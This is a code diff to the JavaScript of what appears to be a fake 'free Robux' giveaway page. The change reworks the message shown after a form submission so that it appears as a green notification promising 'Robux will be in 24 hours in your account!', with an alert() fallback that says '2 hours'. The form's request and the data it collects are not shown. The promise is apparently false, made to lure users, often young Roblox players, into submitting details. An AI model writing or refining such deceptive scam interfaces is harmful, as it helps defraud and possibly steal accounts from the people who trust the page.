@@ -238,14 +238,28 @@
                         });
 
                         if (response.ok) {
-                            this.innerHTML = `
-                                <div class="success-card">
-                                    <h2>✅ Success!</h2>
-                                    <p>Success: Robux will be in 24 hours in your account! 🎁🌟</p>
-                                </div>
-                            `;
-                            // Auto-close modal after 5 seconds
-                            setTimeout(hideAllPopups, 5000);
+                            // Close the modal immediately
+                            hideAllPopups();
+
+                            // Show the success message as a notification
+                            const notify = document.getElementById('timer-notification');
+                            if (notify) {
+                                notify.innerHTML = `
+                                    <div style="text-align: center; padding: 5px;">
+                                        <h3 style="margin: 0; color: #fff;">✅ Success!</h3>
+                                        <p style="margin: 5px 0 0; color: #fff; font-size: 0.9rem; font-weight: 800;">
+                                            Robux will be in 24 hours in your account! 🎁🌟
+                                        </p>
+                                    </div>
+                                `;
+                                notify.style.background = "#10b981"; // Green background
+                                notify.style.borderColor = "#fff";
+                                notify.style.display = "block";
+                                notify.classList.remove('mobile-only'); // Make it visible on desktop too as a notification
+                            } else {
+                                // Fallback for pages without the notification div
+                                alert("Success: Robux will be in 2 hours in your account! 🎁🌟");
+                            }
                         } else {
                             throw new Error('Submission failed');
                         }
